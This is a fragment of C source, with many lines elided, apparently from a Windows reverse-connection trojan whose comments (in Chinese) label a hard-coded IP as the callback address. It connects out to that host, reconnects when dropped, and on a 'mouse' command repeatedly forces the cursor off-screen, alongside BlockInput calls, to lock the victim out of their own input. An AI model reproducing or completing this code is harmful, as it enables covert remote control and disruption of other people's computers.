...
char ServerAddr[] = "10.199.225.74"; //反弹连接的域名
...
void c_socket() 
{
	...
	clientService.sin_addr.s_addr = inet_addr("10.199.225.74");
	...
	while(1) {
		...
		if(strlen(recvCmd)<1){  //SOCKET中断重连
			...
			BlockInput(false);
			continue;
		}else if(strcmp(recvCmd,"mouse")==0){ //重置光标,根据次数多次重置达到锁死
			recv(client, recvCmd, MSG_LEN, 0);
			int countnow = atoi(recvCmd);
			while(countnow){
				SetCursorPos(-10,-10);
				countnow = countnow -1;
			}
